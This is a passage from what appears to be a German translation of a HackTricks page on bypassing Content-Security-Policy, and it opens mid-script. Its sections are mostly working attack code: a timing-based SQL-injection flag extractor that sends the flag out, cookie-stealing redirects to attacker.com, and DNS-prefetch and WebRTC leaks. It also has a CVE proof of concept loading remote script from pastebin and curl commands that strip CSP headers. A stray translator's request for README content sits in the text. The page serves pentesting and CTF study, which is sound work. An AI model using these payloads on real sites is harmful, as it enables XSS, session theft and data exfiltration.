return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
}

async function query(word, end = false) {
let h = performance.now()
f.location = end ? gen2(word) : gen(word)
await new Promise((r) => {
g.onload = r
})
let diff = performance.now() - h
return diff > 300
}

let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
let postfix = "}"

async function run() {
let prefix = "nn9ed{"
while (true) {
let i = 0
for (i; i < alphabet.length; i++) {
let c = alphabet[i]
let t = await query(prefix + c) // Check what chars returns TRUE or FALSE
console.log(prefix, c, t)
if (t) {
console.log("FOUND!")
prefix += c
break
}
}
if (i == alphabet.length) {
console.log("missing chars")
break
}
let t = await query(prefix + "}", true)
if (t) {
prefix += "}"
break
}
}
new Image().src = "http://PLAYER_SERVER/?" + prefix //Exfiltrate the flag
console.log(prefix)
}

run()
</script>
```
### Über Bookmarklets

Dieser Angriff setzt Social Engineering voraus, bei dem der Angreifer den Benutzer **dazu bringt, einen Link über das Bookmarklet des Browsers zu drag\&dropped**. Dieses Bookmarklet würde **malicious javascript** Code enthalten, der beim drag\&dropped oder Anklicken im Kontext des aktuellen Webfensters ausgeführt wird, dabei **bypassing CSP und das Entwenden sensibler Informationen ermöglicht**, wie z. B. Cookies oder Tokens.

For more information [**check the original report here**](https://socradar.io/csp-bypass-unveiled-the-hidden-threat-of-bookmarklets/).

### CSP-Bypass durch Einschränkung der CSP

In [**this CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-biohazard/solution), wird CSP umgangen, indem in ein erlaubtes iframe eine restriktivere CSP injiziert wird, die das Laden einer bestimmten JS-Datei verhindert, welche dann via **prototype pollution** oder **dom clobbering** ausgenutzt wurde, um **ein anderes Script zu missbrauchen, um ein beliebiges Script zu laden**.

Sie können mit dem **`csp`**-Attribut **die CSP eines Iframe einschränken**:
```html
<iframe
src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```
In [**this CTF writeup**](https://github.com/aszx87410/ctf-writeups/issues/48), war es möglich, via **HTML injection** die **CSP** stärker zu **einschränken**, sodass ein Script, das CSTI verhindert, deaktiviert wurde und dadurch die **vulnerability became exploitable.**\
CSP kann mithilfe von **HTML meta tags** restriktiver gemacht werden und inline scripts können deaktiviert werden, indem man den **Eintrag** entfernt, der deren **nonce** erlaubt, und spezifische inline scripts per **sha** erlaubt:
```html
<meta
http-equiv="Content-Security-Policy"
content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```
### JS exfiltration mit Content-Security-Policy-Report-Only

Wenn es dir gelingt, den Server dazu zu bringen, mit dem Header **`Content-Security-Policy-Report-Only`** zu antworten, dessen **Wert von dir kontrolliert wird** (z. B. wegen eines CRLF), könntest du ihn so konfigurieren, dass er auf deinen Server zeigt. Wenn du den **JS content**, den du exfiltrieren willst, in **`<script>`** einbettest und da `unsafe-inline` sehr wahrscheinlich durch die CSP nicht erlaubt ist, wird dadurch ein **CSP-Fehler ausgelöst** und ein Teil des Skripts (das die sensiblen Informationen enthält) wird vom `Content-Security-Policy-Report-Only` an deinen Server gesendet.

Als Beispiel [**check this CTF writeup**](https://github.com/maple3142/My-CTF-Challenges/tree/master/TSJ%20CTF%202022/Nim%20Notes).

### [CVE-2020-6519](https://www.perimeterx.com/tech-blog/2020/csp-bypass-vuln-disclosure/)
```javascript
document.querySelector("DIV").innerHTML =
'<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```
### Leaking von Informationen mit CSP und Iframe

- Ein `iframe` wird erstellt, das auf eine URL zeigt (nennen wir sie `https://example.redirect.com`), die von CSP erlaubt ist.
- Diese URL leitet dann auf eine geheime URL weiter (z. B. `https://usersecret.example2.com`), die von CSP **nicht erlaubt** ist.
- Indem man auf das `securitypolicyviolation`-Event hört, kann man die `blockedURI`-Property abfangen. Diese Property offenbart die Domain der blockierten URI, leaking die geheime Domain, auf die die ursprüngliche URL weitergeleitet hat.

Es ist interessant zu bemerken, dass Browser wie Chrome und Firefox unterschiedliche Verhaltensweisen beim Umgang mit iframes in Bezug auf CSP zeigen, was aufgrund von undefiniertem Verhalten zu potenziellem leak sensibler Informationen führen kann.

Eine andere Technik besteht darin, die CSP selbst auszunutzen, um das geheime Subdomain zu ermitteln. Diese Methode beruht auf einer binären Suche und darauf, die CSP so anzupassen, dass bestimmte Domains gezielt blockiert werden. Zum Beispiel, wenn das geheime Subdomain aus unbekannten Zeichen besteht, kann man iterativ verschiedene Subdomains testen, indem man die CSP-Direktive ändert, um diese Subdomains zu blockieren oder zu erlauben. Hier ist ein Snippet, das zeigt, wie die CSP eingerichtet werden könnte, um diese Methode zu ermöglichen:
```markdown
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```
Indem man überwacht, welche Anfragen von der CSP geblockt oder erlaubt werden, kann man die möglichen Zeichen der geheimen Subdomain eingrenzen und schließlich die vollständige URL aufdecken.

Beide Methoden nutzen die Nuancen der CSP-Implementierung und des Verhaltens in Browsern aus und zeigen, wie scheinbar sichere Richtlinien versehentlich sensitive Informationen leak.

Trick von [**here**](https://ctftime.org/writeup/29310).

## Unsafe Technologies to Bypass CSP

### PHP Errors when too many params

Laut der [**last technique commented in this video**](https://www.youtube.com/watch?v=Sm4G6cAHjWM) führt das Senden von zu vielen Parametern (1001 GET-Parameter, obwohl man das auch mit POST-Parametern und mehr als 20 Dateien machen kann) zu einem Fehler. Jede definierte **`header()`** im PHP-Webcode **wird nicht gesendet**, aufgrund des dadurch ausgelösten Fehlers.

### PHP response buffer overload

PHP ist dafür bekannt, die Antwort standardmäßig auf **4096** Bytes zu **puffern**. Daher wird, wenn PHP eine Warnung ausgibt, durch das Bereitstellen von **genügend Daten in Warnungen** die **Antwort** **gesendet** **bevor** der **CSP-Header**, wodurch der Header ignoriert wird.\
Die Technik besteht im Wesentlichen darin, **den Antwortpuffer mit Warnungen zu füllen**, sodass der CSP-Header nicht gesendet wird.

Idea from [**this writeup**](https://hackmd.io/@terjanq/justCTF2020-writeups#Baby-CSP-web-6-solves-406-points).

### Kill CSP via max_input_vars (headers already sent)

Weil Header vor jeglicher Ausgabe gesendet werden müssen, können durch PHP ausgelöste Warnungen spätere `header()`-Aufrufe ungültig machen. Wenn Benutzereingaben `max_input_vars` überschreiten, wirft PHP zuerst eine Startup-Warnung; jeder nachfolgende `header('Content-Security-Policy: ...')` schlägt mit “headers already sent” fehl, wodurch CSP effektiv deaktiviert wird und sonst geblocktes reflective XSS erlaubt wird.
```php
<?php
header("Content-Security-Policy: default-src 'none';");
echo $_GET['xss'];
```
Bitte den Inhalt der Datei (README.md) hier einfügen, den ich ins Deutsche übersetzen soll. Ich liefere die Übersetzung unter Beibehaltung aller Markdown-/HTML-Tags, Links, Pfade und Codeabschnitte.
```bash
# CSP in place → payload blocked by browser
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>"

# Exceed max_input_vars to force warnings before header() → CSP stripped
curl -i "http://orange.local/?xss=<svg/onload=alert(1)>&A=1&A=2&...&A=1000"
# Warning: PHP Request Startup: Input variables exceeded 1000 ...
# Warning: Cannot modify header information - headers already sent
```
### Fehlerseite umschreiben

Aus [**this writeup**](https://blog.ssrf.kr/69) geht hervor, dass es möglich gewesen sein könnte, einen CSP-Schutz zu bypassen, indem man eine Fehlerseite lädt (möglicherweise ohne CSP) und deren Inhalt umschreibt.
```javascript
a = window.open("/" + "x".repeat(4100))
setTimeout(function () {
a.document.body.innerHTML = `<img src=x onerror="fetch('https://filesharing.m0lec.one/upload/ffffffffffffffffffffffffffffffff').then(x=>x.text()).then(x=>fetch('https://enllwt2ugqrt.x.pipedream.net/'+x))">`
}, 1000)
```
### SOME + 'self' + wordpress

SOME ist eine Technik, die eine XSS (oder stark eingeschränkte XSS) **in an endpoint of a page** ausnutzt, um **other endpoints of the same origin** zu missbrauchen. Das funktioniert, indem das vulnerable endpoint von einer attacker page geladen und anschließend die attacker page auf das reale endpoint derselben origin, das du ausnutzen willst, neu geladen wird. Auf diese Weise kann das **vulnerable endpoint** das **`opener`**-Objekt im **payload** verwenden, um das **DOM** des **real endpoint to abuse** zu erreichen. Weitere Informationen:

{{#ref}}
../xss-cross-site-scripting/some-same-origin-method-execution.md
{{#endref}}

Außerdem hat **wordpress** einen **JSONP**-endpoint unter `/wp-json/wp/v2/users/1?_jsonp=data`, der die gesendeten **data** in der Ausgabe reflektiert (mit der Einschränkung, dass nur Buchstaben, Zahlen und Punkte erlaubt sind).

An attacker kann dieses endpoint ausnutzen, um einen **SOME attack** gegen WordPress zu **generate** und ihn innerhalb von `<script s`rc=`/wp-json/wp/v2/users/1?_jsonp=some_attack></script>` zu **embed**. Beachte, dass dieses **script** **loaded** wird, weil es von **'self'** **allowed** ist. Außerdem, da WordPress installiert ist, könnte ein attacker die **SOME attack** über das **vulnerable callback endpoint** ausnutzen, das die **CSP** **bypasst**, um einem Benutzer mehr Rechte zu geben, ein neues Plugin zu installieren...\
Für weitere Informationen, wie dieser Angriff durchgeführt wird, siehe [https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/](https://octagon.net/blog/2022/05/29/bypass-csp-using-wordpress-by-abusing-same-origin-method-execution/)

## CSP Exfiltration Bypasses

Wenn eine strikte CSP vorhanden ist, die es dir nicht erlaubt, mit **external servers** zu **interact**, gibt es einige Dinge, die du trotzdem tun kannst, um die Informationen zu exfiltrate.

### Location

Du könntest einfach die location aktualisieren, um die secret information an den attacker's server zu senden:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
document.location = "https://attacker.com/?" + sessionid
```
### Meta tag

Du könntest durch das Injizieren eines meta tag umleiten (das ist nur ein redirect, das wird keinen Inhalt leak)
```html
<meta http-equiv="refresh" content="1; http://attacker.com" />
```
### DNS Prefetch

Um Seiten schneller zu laden, lösen Browser Hostnamen vorab in IP-Adressen auf und zwischenspeichern sie für die spätere Verwendung.\
Du kannst einem Browser mitteilen, einen Hostnamen vorab aufzulösen mit: `<link rel="dns-prefetch" href="something.com">`

Du könntest dieses Verhalten missbrauchen, um **exfiltrate sensitive information via DNS requests**:
```javascript
var sessionid = document.cookie.split("=")[1] + "."
var body = document.getElementsByTagName("body")[0]
body.innerHTML =
body.innerHTML +
'<link rel="dns-prefetch" href="//' +
sessionid +
'attacker.ch">'
```
Eine andere Möglichkeit:
```javascript
const linkEl = document.createElement("link")
linkEl.rel = "prefetch"
linkEl.href = urlWithYourPreciousData
document.head.appendChild(linkEl)
```
Um zu verhindern, dass dies passiert, kann der Server den HTTP-Header senden:
```
X-DNS-Prefetch-Control: off
```
> [!TIP]
> Offenbar funktioniert diese Technik nicht in headless browsers (bots)

### WebRTC

Auf mehreren Seiten liest man, dass **WebRTC die `connect-src`-Richtlinie der CSP nicht überprüft**.

Tatsächlich kannst du Informationen _leak_ mittels einer _DNS request_. Schau dir diesen Code an:
```javascript
;(async () => {
p = new RTCPeerConnection({ iceServers: [{ urls: "stun:LEAK.dnsbin" }] })
p.createDataChannel("")
p.setLocalDescription(await p.createOffer())
})()
```
Eine weitere Option:
```javascript
var pc = new RTCPeerConnection({
"iceServers":[
{"urls":[
"turn:74.125.140.127:19305?transport=udp"
],"username":"_all_your_data_belongs_to_us",
"credential":"."
}]
});
pc.createOffer().then((sdp)=>pc.setLocalDescription(sdp);
```
### CredentialsContainer

Das Credential-Popup sendet eine DNS-Anfrage an die iconURL, ohne von der Seite eingeschränkt zu werden. Es funktioniert nur in einem sicheren Kontext (HTTPS) oder auf localhost.
```javascript
navigator.credentials.store(
new FederatedCredential({
id:"satoki",
name:"satoki",
provider:"https:"+your_data+"example.com",
iconURL:"https:"+your_data+"example.com"
})
)
```
## CSP-Richtlinien online überprüfen

- [https://csp-evaluator.withgoogle.com/](https://csp-evaluator.withgoogle.com/)
- [https://cspvalidator.org/](https://cspvalidator.org/#url=https://cspvalidator.org/)

## CSP automatisch erstellen

[https://csper.io/docs/generating-content-security-policy](https://csper.io/docs/generating-content-security-policy)

## Quellen

- [https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/](https://hackdefense.com/publications/csp-the-how-and-why-of-a-content-security-policy/)
- [https://lcamtuf.coredump.cx/postxss/](https://lcamtuf.coredump.cx/postxss/)
- [https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d](https://bhavesh-thakur.medium.com/content-security-policy-csp-bypass-techniques-e3fa475bfe5d)
- [https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme](https://0xn3va.gitbook.io/cheat-sheets/web-application/content-security-policy#allowed-data-scheme)
- [https://www.youtube.com/watch?v=MCyPuOWs3dg](https://www.youtube.com/watch?v=MCyPuOWs3dg)
- [https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/](https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/)
- [https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/](https://lab.wallarm.com/how-to-trick-csp-in-letting-you-run-whatever-you-want-73cb5ff428aa/)
- [https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket](https://cside.dev/blog/weaponized-google-oauth-triggers-malicious-websocket)
- [The Art of PHP: CTF‑born exploits and techniques](https://blog.orange.tw/posts/2025-08-the-art-of-php-ch/)

​

{{#include ../../banners/hacktricks-training.md}}
